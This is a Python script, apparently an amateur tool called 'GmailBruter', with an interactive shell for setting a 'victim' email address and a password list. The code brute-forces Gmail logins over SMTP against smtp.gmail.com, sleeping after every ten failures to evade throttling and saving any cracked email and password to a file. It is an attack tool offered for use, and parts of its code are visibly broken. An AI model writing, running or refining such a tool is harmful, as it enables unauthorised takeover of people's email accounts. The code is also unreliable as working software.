'''
LOL That Tool Was Shit Lol!
It Was Ma First Tool So !!
I Will Clean The Code And Find A Way To Close The SMPT Connection After Some Words And Make A new Connection To Brute On LOL
Maybe There Is Some Problems I Will Solve Every Shit Here
Have Fun!
'''
import smtplib
import os
import sys
import time

Count = 0
def Banner():
	Up = "\t\t\t\t\t\t --------------------- \n"
	Middle = "\t\t\t\t\t\t | GmailBruter(V1.1) |\n"
	Down = "\t\t\t\t\t\t --------------------- "
	Ban = Up + Middle + Down
	print(Ban)

def StartBruteAccount(Passlist,account,SMTPServer,Count,Time):
	with open('{0}'.format(Passlist),'r') as PasswordsFile:
		for Password in PasswordsFile:
			try:
				SMTPServer.login(account,Password)
				Found = True
				print("[+] Got Password!")
				TXTName = input("Enter Name For Data File: ")
				if TXTName == '': # If There IS NO Name Set Use "Data" For File Name
					TXTName = "Data"
				else:
					pass
				# Create Data File! 
				with open('{0}.txt'.format(TXTName),'w') as DataFile:
					DataFile.write("[+] Email IS: {0}\n".format(account))
					DataFile.write("[+] Password IS: {0}\n".format(Password))
			except smtplib.SMTPAuthenticationError:
				Count += 1
				if Count == 10:
					print("[!] Sleep For {0}".format(Time))
					time.sleep(Time)
					Count = 0
					pass
				else:
					print("\rCurrent Falied Password: {0} ".format(Password),end="")
					print("\rCurrent Count: {0} ".format(Count),end="")
					sys.stdout.flush()
			# except smtplib.SMTPServerDisconnected:
			#	print("Disconnected")
			#  It Was Just A Test!

def StartSMTPServiceForGmail():
	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
	SMTPServer.ehlo()
	SMTPServer.starttls()
	return SMTPServer

def HelpGuide():
	print("\nHelp Guide For GmailBruterV2.")
	print("Commands For Shell:")
	print("\thelp   --   To Show This Messages")
	print("\tset target   --   To Set The Victim Email Address")
	print("\tset time   --   To Set Time Between Every 10 Faild Passwords")
	print("\tset list   --   To Set PassList Name ")
	print("\tshow target   --   To Set PassList Name ")
	print("\tshow time   --   To Set PassList Name ")
	print("\tshow list   --   To Set PassList Name ")
	print("\tstart   --   To Start Brute Force Attack\n")

def ContactMe():
	print("Gmail: mdaif1332@gmail.com")
	print("Github: https://www.github.com/DEMON1A")

def StartShell():
	Commands = []
	Account = ''
	Time = ''
	PassList = ''
	with open('Commands.txt','r') as CommandsFile:
		for Command in CommandsFile:
			Command = Command.rstrip("\n")
			Commands.append(Command)
	while True:
		ShellResponse = input("Command: ")
		if ShellResponse.lower() not in Commands:
			print("'{0}' Is Not A Command Here!".format(ShellResponse))
		elif ShellResponse.lower() == "help":
			HelpGuide()
		elif ShellResponse.lower() == "set target":
			Account = input("Target: ")
		elif ShellResponse.lower() == "set time":
			Time = input("Time: ")
		elif ShellResponse.lower() == "set list":
			PassList = input("List: ")
		elif ShellResponse.lower() == "show target":
			if Account == '':
				print("[!] No Target Yet!")
			else:
				print("Target: " + Account)
		elif ShellResponse.lower() == "show time":
			if Time == '':
				print("[!] No Time Yet!")
			else:
				print("Time: " + Time)
		elif ShellResponse.lower() == "show list":
			if PassList == '':
				print("[!] No List Yet!")
			else:
				print("List: " + PassList)
		elif ShellResponse.lower() == "start":
			StartSMTPServiceForGmail()
			Service = StartSMTPServiceForGmail()
			if Account == '':
				print("[!] Set Target!")
				break
			elif PassList == '':
				print("[!] Set List!")
				break
			elif Time == '':
				print("[!] Set Time!")
				break
			else:
				StartBruteAccount(PassList,Account,Service,Count,Time)

# Start
Banner()
StartShell()